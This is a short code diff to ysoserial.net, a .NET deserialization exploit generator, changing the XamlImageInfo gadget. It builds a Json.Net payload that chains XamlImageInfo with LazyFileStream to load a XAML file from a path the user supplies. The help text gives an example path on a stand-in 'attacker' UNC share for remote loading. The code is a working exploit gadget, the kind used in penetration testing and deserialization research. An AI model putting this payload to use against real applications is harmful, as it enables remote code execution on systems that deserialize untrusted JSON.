@@ -118,14 +118,16 @@ namespace ysoserial.Generators
                 {                    
                     if (inputArgs.Test)
                     {
-                        Console.WriteLine("This gadget loads remote/local file: -c argument should provide a file path to your XAML file. UNC path can be used for the remote file loading\r\nExample: ysoserial.exe -g XamlImageInfo -f Json.Net -c '\\\\\\\\attacker\\\\poc\\\\your.xaml'");
+                        Console.WriteLine("This gadget loads remote/local file: -c argument should provide a file path to your XAML file. UNC path can be used for the remote file loading\r\nExample: ysoserial.exe -g XamlImageInfo -f Json.Net -c '\\\\attacker\\poc\\your.xaml'");
                     }
 
+                    inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;
                     inputArgs.IsRawCmd = true;
+                    
                     payload = @"{
     '$type':'System.Activities.Presentation.Internal.ManifestImages+XamlImageInfo, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
     'stream':{
-        '$type':'Microsoft.Build.Tasks.Windows.ResourcesGenerator+LazyFileStream, PresentationBuildTasks, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35','path':'" + inputArgs.Cmd + @"'
+        '$type':'Microsoft.Build.Tasks.Windows.ResourcesGenerator+LazyFileStream, PresentationBuildTasks, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35','path':'" + inputArgs.CmdFullString + @"'
     }
 }";
                 }
